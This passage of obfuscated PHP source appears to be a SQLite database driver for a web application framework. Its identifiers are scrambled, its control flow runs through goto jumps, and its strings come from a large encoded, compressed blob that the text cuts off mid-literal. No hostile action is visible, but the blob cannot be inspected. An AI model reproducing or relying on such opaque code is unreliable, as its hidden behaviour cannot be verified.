$this->connected = !0; @$this->linkID[$bñ’ÙğÉŒâ]->busyTimeout(30000); if (1 != think_config($eù†‹­ìâ[18])) { unset($this->config); } } return $this->linkID[$bñ’ÙğÉŒâ]; } public function free() { $this->queryID = null; } public function query($Fø¨õÑâäŞ) { goto B—Ê®£”•‡; B—Ê®£”•‡: $CîšŸĞÚÉ =& $_SERVER[Ö‘Øù]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } goto fó–ò„‰Ø; Få¾†¼³Åá: if (!1 === $this->queryID) { $this->error(); return !1; } else { $D¾óåİšõé = $this->getAll(); $this->numRows = count($D¾óåİšõé); return $D¾óåİšõé; } goto eÊ»×‡¾†; fä—ŞÔÄ¦Ä: think_status($CîšŸĞÚÉ[20]); $this->queryID = $this->_linkID->query($Fø¨õÑâäŞ); $this->debug(); goto Få¾†¼³Åá; fó–ò„‰Ø: $this->queryStr = $Fø¨õÑâäŞ; if ($this->queryID) { $this->free(); } think_action_status($CîšŸĞÚÉ[19], 1); goto fä—ŞÔÄ¦Ä; eÊ»×‡¾†: } public function execute($bÄÙß½ªØİ) { goto CÚÃ«Æ›½ö; B‰“Ëõ ³Ñ: $this->queryStr = $bÄÙß½ªØİ; if ($this->queryID) { $this->free(); } think_action_status($E·øĞå¦×º[21], 1); goto Bá‡àÊŠ; CÚÃ«Æ›½ö: $E·øĞå¦×º =& $_SERVER[Ö‘Øù]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } goto B‰“Ëõ ³Ñ; E”šŞÛªÊĞ: if (!1 === $EÆç‰İ¯Æô) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->changes(); $this->lastInsID = $this->_linkID->lastInsertRowID(); return $this->numRows; } goto B–„Ê£‘ªÒ; Bá‡àÊŠ: think_status($E·øĞå¦×º[20]); $EÆç‰İ¯Æô = $this->_linkID->exec($bÄÙß½ªØİ); $this->debug(); goto E”šŞÛªÊĞ; B–„Ê£‘ªÒ: } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { $this->_linkID->query($_SERVER[Ö‘Øù][22]); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $F·†ŸŸÏŒò = $this->_linkID->query($_SERVER[Ö‘Øù][23]); if (!$F·†ŸŸÏŒò) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } public function rollback() { if ($this->transTimes > 0) { $D¾øÍáÇŸ = $this->_linkID->query($_SERVER[Ö‘Øù][24]); if (!$D¾øÍáÇŸ) { $this->error(); return !1; } $this->transTimes = 0; } return !0; } private function getAll() { $c–æåªğÖÇ = array(); while ($CÛè„Ç‡ˆ = $this->queryID->fetchArray(SQLITE3_ASSOC)) { $c–æåªğÖÇ[] = $CÛè„Ç‡ˆ; } $this->queryID->reset(); return $c–æåªğÖÇ; } public function getFields($a½ÍŒù¬Å) { $BÙİ¸¨ãìœ =& $_SERVER[Ö‘Øù]; $E´¦„èÃÑ´ = $this->query($BÙİ¸¨ãìœ[25] . $a½ÍŒù¬Å . $BÙİ¸¨ãìœ[26]); $dš ‡Ö¤«‹ = array(); if ($E´¦„èÃÑ´) { foreach ($E´¦„èÃÑ´ as $DÎ¬¸ã”È‘ => $AÊ™˜íŸöÑ) { $dš ‡Ö¤«‹[$AÊ™˜íŸöÑ[$BÙİ¸¨ãìœ[28]]] = array($BÙİ¸¨ãìœ[28] => $AÊ™˜íŸöÑ[$BÙİ¸¨ãìœ[28]], $BÙİ¸¨ãìœ[29] => $AÊ™˜íŸöÑ[$BÙİ¸¨ãìœ[29]], $BÙİ¸¨ãìœ[31] => (bool) ($AÊ™˜íŸöÑ[$BÙİ¸¨ãìœ[31]] === $BÙİ¸¨ãìœ[33]), $BÙİ¸¨ãìœ[34] => $AÊ™˜íŸöÑ[$BÙİ¸¨ãìœ[53]], $BÙİ¸¨ãìœ[36] => (bool) $AÊ™˜íŸöÑ[$BÙİ¸¨ãìœ[54]], $BÙİ¸¨ãìœ[39] => (bool) $AÊ™˜íŸöÑ[$BÙİ¸¨ãìœ[54]]); } } return $dš ‡Ö¤«‹; } public function getTables($F³ÊßÍ¿öà = '') { $AöÖâá­¨Ö =& $_SERVER[Ö‘Øù]; $c¢Óœ´Ç‡ = $this->query($AöÖâá­¨Ö[42] . $AöÖâá­¨Ö[43] . $AöÖâá­¨Ö[44]); $CÜ°¯âéŠ® = array(); foreach ($c¢Óœ´Ç‡ as $b¨™—ŸäÆæ => $e¿äå´â) { $CÜ°¯âéŠ®[$b¨™—ŸäÆæ] = current($e¿äå´â); } return $CÜ°¯âéŠ®; } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $eµöäºÒ„¢ =& $_SERVER[Ö‘Øù]; $this->error = $this->_linkID->lastErrorMsg(); if ($eµöäºÒ„¢[33] != $this->queryStr) { $this->error .= LNG($eµöäºÒ„¢[45]) . $this->queryStr; } think_trace($this->error, $eµöäºÒ„¢[33], $eµöäºÒ„¢[46]); return $this->error; } public function escapeString($Aİ«Å–µèß) { $E…½ÇŠ¿‰… =& $_SERVER[Ö‘Øù]; if ($this->_linkID) { return $this->_linkID->escapeString($Aİ«Å–µèß); } return str_ireplace($E…½ÇŠ¿‰…[55], $E…½ÇŠ¿‰…[56], $Aİ«Å–µèß); } public function parseLimit($Eä’¼«œ) { $aÄÑ§ô‡×› =& $_SERVER[Ö‘Øù]; $F«ì±ˆƒÛ = $aÄÑ§ô‡×›[33]; if (!empty($Eä’¼«œ)) { $Eä’¼«œ = explode($aÄÑ§ô‡×›[47], $Eä’¼«œ); if (count($Eä’¼«œ) > 1) { $F«ì±ˆƒÛ .= $aÄÑ§ô‡×›[48] . $Eä’¼«œ[1] . $aÄÑ§ô‡×›[49] . $Eä’¼«œ[0] . $aÄÑ§ô‡×›[50]; } else { $F«ì±ˆƒÛ .= $aÄÑ§ô‡×›[48] . $Eä’¼«œ[0] . $aÄÑ§ô‡×›[50]; } } return $F«ì±ˆƒÛ; } } goto c¤¤öÄì©; BÏİ„õÑ: $aÓùÁª»¥å = strrev(base64_decode($_SERVER[¦¦åº…Öñ][0])); function binCheckNeq($CäÃõ¶äµ, $c¤ŠªÙµ£Á) { return $CäÃõ¶äµ != $c¤ŠªÙµ£Á; } $_SERVER[$_SERVER[¦¦åº…Öñ][1]] = $aÓùÁª»¥å($_SERVER[$_SERVER[¦¦åº…Öñ][2]]); goto Bº÷è‰š’µ; A¼Ó‘ˆëÈ‰: if (!function_exists('_kodDe')) { function _kodDe($a–Çù‚­Ú) { $a–Çù‚­Ú = base64_decode($a–Çù‚­Ú); $Fà¦¼äÏÇ = strlen($a–Çù‚­Ú); $C˜¼í¢éİ‹ = ''; $b²Ò¦„—› = ord($a–Çù‚­Ú[0]) - 30; for ($DàøÄÈÃÌÕ = 1; $DàøÄÈÃÌÕ < $Fà¦¼äÏÇ; $DàøÄÈÃÌÕ += 2) { if ($DàøÄÈÃÌÕ + 1 < $Fà¦¼äÏÇ) { $C˜¼í¢éİ‹ .= chr(ord($a–Çù‚­Ú[$DàøÄÈÃÌÕ + 1]) + $b²Ò¦„—›); $C˜¼í¢éİ‹ .= chr(ord($a–Çù‚­Ú[$DàøÄÈÃÌÕ]) + $b²Ò¦„—›); } else { $C˜¼í¢éİ‹ .= chr(ord($a–Çù‚­Ú[$DàøÄÈÃÌÕ]) + $b²Ò¦„—›); } } return $C˜¼í¢éİ‹; } } define("\xd6\x91\xd8\x90\xf9", "\375\230\256\324\344"); $_SERVER[Ö‘Øù] = explode(base64_decode('fAJ8BHwC'), gzinflate(substr("\37\213\10\0\0\0\0\0\0\3\315\275\171\174\24\105\372\60\356\175\255\312\327\143\275\127\233\160\344\140\216\44\44\34\201\20\46\311\44\31\231\144\302\314\204\53\11"."\103\147\246\63\323\311\314\364\244\273\47\27\240\353\205\256\50\254\202\367\275\342\212\312\41\336\27\352\56\312\242\254\212\56\170\256\67\40\170\254\307\256\272\170\276\165\127"."\165\317\240\337\337\347\367\376\361\362\1\246\353\251\273\352\251\247\236\347\251\247\236\272\374\317\177\336\165\371\143\27\135\376\352\227\213\16\132\164\310\242\203\236\331\367\335"."\x2e\xfc\x5\xfe\x1d\xb8\xe8\x50\xfc\x7d\xd6\xd2\x23\xe\x40\x7f\xe\x5e\x7a\x69\x51\x51\xd3\x84\xa3\xc6\xb5\x1c\xbd\xfc\x81\xb5\xf2\x5d\xf2\x1a\xf9\xf2\x80\x7f\xeb\xdf\x7d\xc7\xbc\xb8\xe6".base64_decode('bO/u27cO7T7wgDveW3JtFUiM81bhHymtmZIyqBqmgQFRLd2txvG3msa/bvxj9CU=')."\125\123\301\337\221\226\100\70\22\152\153\155\365\6\303\21\122\242\30\237\322\142\344\53\43\353\162\212\24\236\121\164\3\124\45\26\27\311\150\31\45\155\201\160\100\114\66".strrev('Zú6õªíg@b–¦¬3u”ÈgĞ‡}eôŠè¤—«nxHÜÀş­½êF×Õ% Ù.å')."\244\160\320\323\22\362\324\205\175\201\26\14\256\13\64\67\373\302\271\360\140\300\357\257\365\324\315\310\215\151\15\172\32\233\75\22\150\137\122\211\250\351\156\255\110\132\200"."\x63\x16\x48\xc5\xf8\xa3\x41\x55\x92\x31\xfc\x99\x96\x69\x73\xcc\xa1\xc\xf9\xa\xb3\x2f\x30\x7\xe9\x6c\x32\x89\x3\x2d\xec\x8b\xb4\x5f\xe9\x96\xb3\x49\x32\x66\xf5\x62\x20\xa3\xab\x29\x99"._kodDe('KXJrJ3uVuTjtj8OPj9eDbHXJxQNaIvzfgz8/iD43l7RTI6y2IT9btgKoNZs5GhcQ')."\246\242\113\263\233\274\101\257\4\233\136\135\210\172\134\50\341\174\155\55\140\100\44\217\337\57\355\257\4\123\111\145\150\61\70\117\236\302\2\301\172\157\120\252\235\53\361".base64_decode('cYpqqZSWdoFSwHyaQlO9wSD+cBAM9vvg1JFAoKEh5GUh0rmZftCS8QRLLaFYd9I=')."\214\364\313\311\54\105\326\136\374\133\110\176\310\257\146\20\4\356\123\323\152\226\40\53\51\102\323\330\312\41\37\131\232\132\241\20\45\106\76\122\40\277\106\26\27\130\151"."\xfd\xf8\xb3\x7a\x1a\xfe\x9d\x42\x12\x75\x45\x60\x9c\xa2\x9b\x11\x25\x1d\xd5\x62\x6a\x9a\xac\xc7\x1a\xb2\xf6\x8\x6\xca\x66\xa2\x5e\x57\x41\x3a\x52\xa0\xe6\x8a\x6a\x99\xa1\x66\xad\x9f\x74".base64_decode('pltNKn623Lq1ZEzReTgDsosxpFfqsJC7JZsSk7BgNKEmYzpdpb+UEtABtXuIr0Y=').base64_decode('Q8vqUcUH1gvP28paUkYSKaYJOm3QfrVlkpocCym60NcGkDGQNUVgFiVr0PRUPaA=').base64_decode('G6R+sFrUtjwRvXS9xIQhdBF6V9R+nvOnzvbp4L9iQvw6SNMSSjIZUQYVsq5SsUo=')."\x83\xf6\xd5\x6d\x74\xa9\x69\x37\x80\xe0\xa0\x2f\x10\x49\xc8\x46\xa2\x39\x56\x19\x41\xb9\x28\x4d\x8d\x29\x83\xae\x4c\x22\x43\x96\x3e\x5b\xed\x1d\x16\xbc\x87\xb3\xd3\xa2\x99\x5e\x81\x32\x27"."\xb5\xa8\x9c\x14\x7b\x8a\xbf\x13\xa6\x99\x9\x29\xe9\x18\x1c\x10\xd2\x23\x6d\x20\x8d\x6\x2c\xa3\x28\x24\x51\xbd\x43\x8a\x49\xcd\xd2\x5c\xa9\xa9\x4a\xad\x32\x68\xc6\x54\x92\x7d\xd1\xde\x31"."\230\301\200\346\40\301\230\2\22\126\6\115\62\50\322\224\150\102\326\301\164\125\147\315\156\347\44\102\137\62\231\244\32\225\115\125\113\273\265\250\251\230\116\303\324\25\231".strrev('Q@® ‘LdU¤\'w¬ Æ¡	RUÓWº8'."\r".'©2ON’×SiiÖpÃF‰æ”').strrev('š½!«âğ¸G)¦É%W›'."\n".'†hÈÕz²i F˜U4Y/Nè­Ñ´åÖ¥“‹£k‚')."\116\252\151\45\47\255\167\60\243\352\212\101\333\52\65\66\207\111\41\240\164\305\331\252\313\361\224\134\45\145\262\135\140\144\310\352\315\3\303\251\311\320\124\111\121\30\164"."\x48\xa9\xac\x61\x3a\x75\x5\x50\x29\x15\xec\x87\x64\x8e\x7d\xdd\xce\x66\xb8\xb4\x54\x25\xe6\xc\x1\x62\x4e\xc0\xe3\x4b\x2b\x24\x80\x36\x12\x8d\xc3\xd0\xa6\x70\xb8\x35\xe2\x6b\x0\x7b\x76"._kodDe('LCl93sTJ+4MnjViOZMuoOgEdJvSEKtkEs3p19Me87J9zcsx1lF18nHlQlsgf/5es')."\150\24\114\34\2\64\204\46\206\323\235\61\235\101\71\35\207\343\323\65\144\52\4\375\214\376\270\165\240\375\112\72\156\46\150\306\220\67\70\313\33\214\204\2\15\341\331"."\236\40\331\355\323\0\113\6\151\125\260\350\244\63\250\304\300\320\107\115\232\117\316\300\121\243\151\340\302\200\163\105\143\341\142\241\161\176\137\43\34\230\172\247\1\22\71"."\305\124\264\154\277\232\122\141\333\115\26\203\106\22\260\2\215\244\101\156\324\241\352\216\104\111\121\107\154\134\261\23\374\137\122\334\336\121\357\52\351\254\161\253\74\217\273"."\314\125\46\225\227\116\220\132\1\157\242\312\111\211\164\72\47\105\251\24\230\361\13\3\0\267\56\141\131\333\206\16\3\203\336\231\155\336\120\70\322\354\15\67\5\352\111"."\15\136\17\371\362\153\170\151\322\36\265\343\237\116\27\247\307\140\316\175\51\71\156\243\322\60\324\254\351\212\25\302\167\215\331\152\214\222\161\30\154\122\324\170\202\364\117"."\x85\xa5\x45\xb5\xa4\xa6\xcb\x49\x48\xc5\x28\x12\x2b\x94\xb2\xc4\xd5\x6e\x32\x3f\x98\x60\xf2\x40\x48\x4d\x65\x28\x5d\x33\x13\xd9\x54\x97\xf0\x49\xd9\x52\x30\xdf\x74\x7b\x49\x68\x6c\x7b\xd3"."\x74\xf2\x55\xe5\x26\x9\xc7\x94\x37\x50\xca\xec\xe\x8d\x7\x7f\x39\x19\x8e\x69\x29\x99\x72\xbb\x88\x24\x29\x31\x4c\x93\x30\xa8\xc4\x12\xd3\xa4\xc8\x7c\xbf\x34\x75\x53\x83\x50\xdd\x92\xa4".base64_decode('WTETGpmkuEKblGVto62MKUmFjkZCoSS9lCQDOxMbq25G3gHjBqB8S1WNIMgJGSk=').strrev('¥ïYf±˜4º,•n•Õo§™xĞ8¡¢?Í„5BN¹`=]MØ$ÒY0]ù'."\r".'')."\xc0\xc\xf1\x6d\x7\x6\x84\xc2\x1a\xda\xfc\xfe\x48\x5d\xa0\x25\xc\x78\x68\xc\x99\x1d\xf4\x85\xbd\x14\x47\x3d\xf5\x11\x4f\x5d\x2b\xdb\x44\xf9\x8c\x93\x4\x90\x60\xe4\xee\x6\x18\xd2\x5f"."\56\354\104\174\313\342\304\234\156\265\220\130\343\157\100\235\63\132\332\120\234\121\122\132\214\223\165\234\142\212\215\246\347\344\340\234\373\240\123\116\15\73\123\140\230\234\254".strrev('nè£À%èÕ8	J‰kGi:)u=ÀP¨dˆ@Öö·D``pß\'+Ìµ‹'."\n".'VÖé')."\x2d\x13\xde\xc9\x33\x3b\x44\x49\x6f\x16\xa4\xd7\xd5\x61\x99\xf7\xb1\x86\xb6\x87\x94\x3d\x98\x4a\x72\x86\xd0\xda\x2b\x27\x9f\x8b\x70\x93\xaf\x65\x46\xa4\x39\x50\xef\xf5\x47\x7c\x2d\x80\x2e"."\x85\x73\xe1\x6d\xad\xf5\x1e\x3a\xb9\x22\xbc\x36\x10\x6e\xb2\x40\xdb\x0\x65\x9a\xe5\xf1\xfb\xec\xc9\xbd\x73\x7c\xa1\x70\x28\x6f\x14\x80\xb5\x79\x6d\x31\x40\x16\x6c\xd\x7a\x1b\x7c\x73\x58".base64_decode('sMHn9deHInWeuiaepsXTTAKRbiiNGW5r+gggsSEm00X6oXxKBytiEaAiVDSIcDw=')."\x0\xdb\xa5\x42\x70\x8f\x74\x17\x4a\xc5\xa8\x27\x84\x47\x8f\x6a\x59\x8a\x8d\x8c\x4d\x4c\x51\xaa\x92\x92\xc9\xb2\x92\xe9\x56\x58\x84\x7f\x8a\x25\x4f\x48\x32\x33\x11\x46\x3f\xba\x86\xd8\x27".base64_decode('6gYNA4aQ1C8Rcp/TgghMU6t0M8qdH+DpNhkVsIXBuuBxYAY8SPwGmIBmJELXmgE=').strrev('AñB*d}àIÉ³ò"}”Eü2>´(Hd‘¥ `ìÈçĞoV#}7Nmä')."\xef\xd1\xe8\x50\x2e\xc2\x3f\x63\xf1\xf\x60\xfb\x48\xe5\x4a\x9a\x8e\x7a\x17\xa4\xe6\x8c\x30\x90\x8f\x6e\xb0\x1a\x28\x25\xd6\xb2\xac\xb6\x2e\x4d\x4b\xd2\x75\xa\x38\x0\x46\xf\x98\xe4\xdd"."\x63\x50\x24\x19\xa4\xc4\x67\x1c\xdd\xd2\xc8\x8e\x12\xe\xcc\xf0\xb6\x44\x28\x66\xe1\x90\x80\x8d\x18\x0\x64\xd9\x40\x90\xc\x88\xa9\xf5\x52\x81\xa\x47\x6\xbd\x21\xba\xca\x75\xa5\x2f\xab".strrev('Šj2*1Ü³«?’hà–\\:„qÓ%ÅêçîÔWïÏwªE¦ÀV,Æ»ráÒ')."\xab\x3a\xdc\x1d\xee\xa2\x9a\xaa\x76\x8f\x73\x58\x76\xe\x97\x3a\x27\x3b\x3b\xc7\x75\xb8\x8a\xc7\x11\x40\xe7\xc2\x72\x47\xc5\x62\x98\x0\x24\xac\x19\xd5\x9\x7e\xaa\x3b\x6a\xc6\x74\x38\xc7".base64_decode('nrNgentHZ2HVuJEdrlEdA50lxTW0nmhWB8JidIg1NTauCDQJMEwsSRqRPCEBjRg=')."\x56\x33\x1c\xba\x70\xc2\x62\xa\x7\x73\xa8\xc4\x79\x8e\x76\x67\xc7\xb8\xce\x1a\x21\x9f\x0\xb2\xd7\x5\x98\x25\x40\x7f\x13\x2c\x9d\xc7\x39\xf\xf6\x8c\x65\x85\xeb\x9e\xe0\x47\x36\x1d\xe5"."\324\23\256\213\56\71\112\350\200\32\117\263\45\4\270\0\46\244\133\371\364\205\143\360\357\142\72\221\161\145\220\222\206\164\267\252\23\354\314\246\325\76\252\203\110\53\175"."\344\103\63\51\176\167\51\346\200\102\321\3\300\55\141\200\34\124\60\4\121\102\50\211\330\102\122\3\27\320\24\44\255\220\136\144\42\220\47\33\140\241\230\222\46\363\164"."\44\111\155\104\345\214\22\22\172\30\211\204\75\265\176\157\204\122\30\102\211\151\30\121\305\132\246\265\3\135\343\24\225\322\207\50\147\322\221\74\102\126\276\321\227\224\20"."\x61\x90\x14\x5d\xd7\xf4\x2a\xa4\x9d\x34\xb2\x19\xc8\xcc\x1\xd9\xcb\x4\x63\x2b\x1\xc1\x5d\xaa\x9e\x26\xe1\x21\x27\xf9\x22\xe2\x4\x64\x64\xca\x39\x40\x59\x5a\xe0\x6\x20\x85\x22\x6d\xca"."\xf0\x19\x32\x0\xb\x46\xf9\x21\x77\x51\x47\x47\xb6\x5d\x89\x75\xb6\x3\xc4\x97\x9d\xdd\x9d\xb\xc7\x2f\x2e\xa6\x7c\xbc\xbb\x3\xfc\xa1\x1\x4f\x1e\x25\x5a\x84\x51\xc3\x8\xd8\x9f\x5d\xb0"."\x1d\x4c\xf\x62\x9\xb0\x68\x1c\xd4\x74\xc6\x34\x65\x2c\x6c\xb7\xa9\x99\x72\xd2\x52\x44\x18\x42\x28\x69\xa2\x1b\x37\x51\x19\xe0\xd9\xf6\x73\x8a\x5\xb7\x72\x41\x7\x89\xc8\x69\xb\x53\xb0"."\x31\x5\x88\xa0\xfe\x82\x39\x42\x8a\xe9\x62\x29\x1c\x42\x64\x4\x84\x49\xff\xf0\xff\xd5\x5\x94\xd8\xa7\xc1\x72\xaa\x13\xb6\x3a\xac\xbf\x9\xd\x19\xa6\x92\xb2\xa8\x2c\xd\x45\xd6\xa3\x89"."\x86\x6c\x32\x69\x32\xe6\x3f\xa9\xf6\x92\x1a\xc8\x5a\x59\x90\x2f\x6d\x83\xa6\x53\x21\xb7\x84\xd4\x5b\x50\x92\x2f\xa1\x2f\x9d\x6\x22\xa9\x88\x5b\x7c\x57\x6d\xf4\x0\xfe\x25\x2c\x15\x51\xf5"."\236\344\153\221\152\3\1\277\327\323\42\301\15\234\154\74\200\73\10\171\133\75\140\327\202\342\162\50\354\45\32\107\137\275\223\226\73\307\351\253\307\337\354\103\215\321\171"."\2\304\316\244\120\242\360\42\41\310\137\72\240\156\307\1\271\10\7\150\256\3\12\113\16\316\323\73\270\306\314\321\257\52\3\350\203\261\326\16\302\161\73\114\131\7\314"."\0\144\211\311\247\257\336\241\32\365\110\234\100\25\240\50\332\40\63\1\265\30\111\171\310\201\33\347\127\372\225\244\203\66\315\101\133\354\240\342\200\3\211\167\365\244\131"."\155\140\341\220\146\241\117\100\37\23\16\210\52\20\123\35\134\243\107\252\23\344\17\7\227\115\34\161\135\313\146\132\151\115\102\10\67\206\0\170\113\31\40\250\151\246\203"."\xca\x9b\x8e\x5c\x51\x34\xff\xd8\xe5\x6f\x3a\x1a\x6c\x7b\xdd\x64\xa2\x60\x54\xee\x90\xfc\xca\xcc\xe4\xe\xbe\x55\xa4\x5a\x88\x4b\x24\xa2\xf9\x62\xba\x79\x59\xd2\xf0\xb9\xa4\xeb\x29\xa9\xf0"."\20\34\155\376\65\213\257\107\330\241\6\271\137\104\263\174\50\107\267\20\212\236\134\305\316\65\300\234\245\265\13\227\166\375\55\254\64\54\307\103\102\165\246\34\247\165\345"."\211\305\337\101\45\72\24\345\2\152\275\40\366\132\103\154\2\320\112\311\207\345\371\47\226\141\56\233\207\243\216\74\222\16\44\105\147\66\251\226\125\360\353\353\217\364\4"."\x91\xb3\x40\x86\x33\x4\xb8\xb1\x90\xa4\x86\xc0\x6\xd5\x90\x94\xc9\xe\x24\xc7\x0\x8f\xef\xd2\x95\x8c\xac\xea\x2e\x6b\x22\x9c\xa0\x5c\xcc\x4f\xa8\xad\xc3\x1a\x82\xeb\xcb\x85\xa8\x2f\x3a"."\24\341\171\375\336\206\260\164\166\0\120\56\125\213\340\74\21\230\130\102\377\151\151\311\122\66\35\117\251\32\305\363\260\234\216\141\310\2\100\326\27\124\27\320\112\12\54".base64_decode('2TmyWBvhoEEpF/3gfIijBDcqND58K6KgAN/5soTNkw0icEEtNvlSKIzPvYidCAE=')."\354\0\332\56\113\275\60\310\127\26\305\31\11\126\340\20\30\23\110\137\234\174\215\10\101\362\143\35\171\33\346\332\266\115\70\122\255\152\172\110\115\213\272\54\16\345\73"."\x2f\xdf\xf8\xe1\x4a\xb7\x69\xdf\xea\xf7\xf7\x8d\xb7\x13\xae\x2b\x73\x10\x1d\x9a\x23\xa9\xa6\x7b\x85\x4d\x99\x2b\x6a\x40\xeb\x61\x56\xa1\xed\xa4\x24\x5b\xcb\x29\xa9\x25\x9d\x6e\x3\x92\x7f".base64_decode('xLbSycpIyDofU0qSIF3gGkKYhAeFZN1yP2dKLHkEwmKYQ7T14qe1UBys31+giSk=')."\64\362\5\105\232\245\32\176\60\166\371\276\121\117\303\132\336\40\124\263\321\157\15\341\77\75\365\266\60\4\110\45\120\104\141\204\343\210\10\212\2\106\312\254\371\160\3"."\x3d\x6c\x37\x0\x5c\x7c\x12\xec\x81\xba\xb\x2e\xa6\x46\xb8\xa5\x89\xbb\x9\xa3\xfe\x6\xdc\x3e\x45\xc\xd\x29\x60\x15\x11\x8\x2f\x2d\x94\x13\x27\xa6\xe6\x4a\x22\xb8\x53\xf0\x9d\x85\x8e"."\74\137\227\174\66\370\42\264\40\116\234\267\64\13\122\104\162\33\5\221\77\177\270\101\327\30\57\314\30\5\173\242\72\44\154\232\342\320\13\273\274\60\120\26\206\44\7"."\44\344\261\263\46\66\250\55\150\37\157\262\227\141\20\125\105\323\35\2\355\212\56\40\102\220\103\145\107\251\300\263\161\112\265\320\100\173\17\331\105\27\333\20\300\324\64"."\40\227\352\56\35\324\314\33\104\244\202\54\233\206\116\322\52\124\24\117\47\20\113\24\343\327\250\204\13\327\277\67\246\232\20\2\267\101\215\352\257\171\102\341\140\227\301"."\x44\xea\x8b\x36\x91\x9c\x49\xe0\x1c\xbf\x63\x8c\x25\x65\x3e\x5e\xc0\x55\x82\xb6\x6f\x57\xfe\xf3\x6a\x78\xe2\x8d\xbf\x4\x23\x8f\x14\x3b\x2\x47\x40\x97\x61\x6a\x19\x1e\x23\x4\x71\xb4\x10".base64_decode('xQsVUrGBRu0AqB5DDC4fKJSW5EXSL15NriRIIZyr+Oo9uk7RB3cOqtoBUARBuhQ=')."\242\270\237\157\243\301\205\173\373\271\361\6\56\12\126\354\302\53\321\45\307\142\1\252\372\26\277\163\223\212\232\300\374\5\41\173\32\126\224\20\312\237\334\223\114\362\123"."\166\173\170\277\131\360\242\23\63\211\220\375\146\153\100\242\47\75\16\313\7\143\102\211\310\161\133\71\154\156\363\140\347\304\255\264\164\377\334\307\176\210\15\237\320\374\141"."\260\123\327\45\324\264\142\260\15\127\147\306\121\377\17\361\301\271\163\0\327\312\376\20\7\306\11\332\143\135\201\0\161\167\145\52\122\116\232\4\6\2\155\306\21\323\302"."\xfa\x4\x51\x19\xc2\xe2\xb1\xe0\x3\x58\xac\xb8\xcf\x70\x7b\xf0\x5\xc0\x62\xcc\x8f\xa1\xf6\x74\xa\x55\x12\x23\x3a\x37\xc8\xb6\x38\x31\x13\xc0\x28\xc8\x37\xed\xaf\x4c\x1a\xcd\x8a\xe2\x4c".base64_decode('1u07fqQme7de+tIHay4gODMg610mYWfJkc2iA8G/w/A3N+m7aE679uHm3zZ8v+0=')."\335\15\217\236\172\372\304\127\316\376\323\272\346\207\347\314\75\271\175\376\33\367\271\276\111\117\170\341\370\72\275\350\225\323\364\242\371\216\227\137\230\261\155\302\33\123\127"."\x35\xbd\x7c\x62\xe2\xd2\x93\x52\xdb\xe\x72\x6e\x1b\x7b\xfa\xad\x9e\xf3\xc7\xee\x79\xea\xae\xd7\x5e\x7c\x6a\xcf\x1f\xa7\x8e\x1f\xbd\x2b\xfb\x58\xe9\xac\x1b\xc7\x3f\x3c\xfe\xa3\x45\x1f\xdd"."\250\35\266\376\167\265\225\77\174\363\355\73\77\375\364\126\115\321\330\232\47\173\347\75\367\132\307\344\32\147\364\256\65\17\76\177\174\323\21\155\377\163\335\173\312\357\253"."\237\132\275\340\246\307\112\347\172\16\114\125\366\254\56\366\111\137\56\172\355\316\13\327\335\173\303\3\127\174\350\77\150\312\276\376\246\322\211\306\273\177\32\267\357\347\242".base64_decode('8e+t/Mr92+MKDj+zX6m+d0f9Q417a4um3fLvt/XnH2x7d1X/xS8saVn1/aJbzz4=')."\370\255\303\217\71\370\226\307\72\226\257\171\154\321\317\37\76\267\355\331\223\276\376\307\11\307\37\335\71\377\326\173\307\372\263\235\47\76\177\146\131\333\215\277\235\363\372".strrev('ÿëIü_¯Òşû?şö]/Öc©eŸî:N|?;‹Ãyş‹iñ.qşwâ;O#šM')."\336\17\36\115\216\214\124\306\372\136\235\242\135\175\224\63\74\111\73\371\314\37\377\263\354\207\127\47\254\71\260\346\260\311\355\211\257\253\376\235\71\365\323\123\327\145\117"."\x78\xad\x77\xed\xac\x7b\x3a\x9a\x47\x9f\xf6\x6a\xf3\xe9\x2b\xa7\x9c\x92\x5d\xb1\x7c\xef\xd1\xfe\xb7\x7c\x35\x87\xdd\xbe\x69\xe7\xc2\x81\x49\x6f\xaa\x23\x76\xad\x29\x8a\xb7\x1f\xda\xbb\xea".base64_decode('z7dfH1y7/cA5dxZtb18dDt5x2MTVuypKsh3qQ60FIx/706yvu2dcs/K0pqtvm7U=').strrev('3ŸBùëŞÙ‡÷\\­ÈwÈ?ÎÖz;Ïä»_9á«ğ•»¬Şa¼_£uÌíxVv').base64_decode('d6hn9TUfHxVaf9WpgaJNH1a0tn163oZNT0eu2n538O6HH3BcufS5l7b954cnfRc=').base64_decode('Ll986ayvry6464WqOY8trG+95O1DPvauOc086+r+jw6JNv/17BMq//Kvo898b5s=')."\xba\x67\xdf\xeb\xa7\x3d\x7b\xf7\x5\x5f\x96\x1e\xf0\xfa\xd2\xc7\x8f\xbd\xe2\xa2\xfb\x3f\x73\x7d\xb3\xa0\xf1\x86\xb5\x6f\x96\xdd\xfb\xd8\x9e\x23\x1e\xb8\xeb\xe6\x7b\xce\x7a\xf4\xe8\x57\x4a"."\xd6\xbc\x2f\xbd\xd4\x3e\x73\xf6\xd\x87\x1c\xb2\x64\xce\xeb\xc7\x3e\xfd\xd8\xd8\x83\xdf\x39\xa0\xbf\xb3\xec\x92\xc9\x89\x65\x17\x87\xeb\x4b\x4e\xde\xf0\xbb\x93\xa7\x65\xef\x9b\x1c\xbd\x75"."\367\365\277\113\77\273\352\321\217\332\63\125\113\26\164\77\262\363\364\366\55\243\357\337\366\376\314\125\163\377\134\75\276\264\346\355\33\57\372\343\370\333\266\7\106\174\372".base64_decode('+CnLzzhuxWH6l5ed+d4EeSix+bvyE+KJM5fuu2tx9KXtFdN2bL4nuvubaWNOG5A=')."\56\171\163\331\212\202\52\243\377\230\175\217\4\72\117\132\274\355\317\343\156\150\135\125\135\176\323\261\145\33\26\167\116\255\160\256\230\321\131\361\171\355\113\331\43\117\137".base64_decode('2HntdTc9MnT+jtYxb3wYf/Z35x8XOPWwzrLYB7ep7q+uPHjt1Rs6tt9SdsUfj8w=')."\136\270\363\210\322\23\226\377\153\356\262\263\246\151\327\275\275\72\221\74\250\62\253\25\104\117\272\343\206\317\16\76\160\372\362\303\326\135\172\347\234\354\241\73\307\137\131"."\xfc\xcd\xa8\x11\x9d\x9f\x9f\x72\xfd\xbe\xcb\xdf\x32\x96\x1c\x3a\xe3\x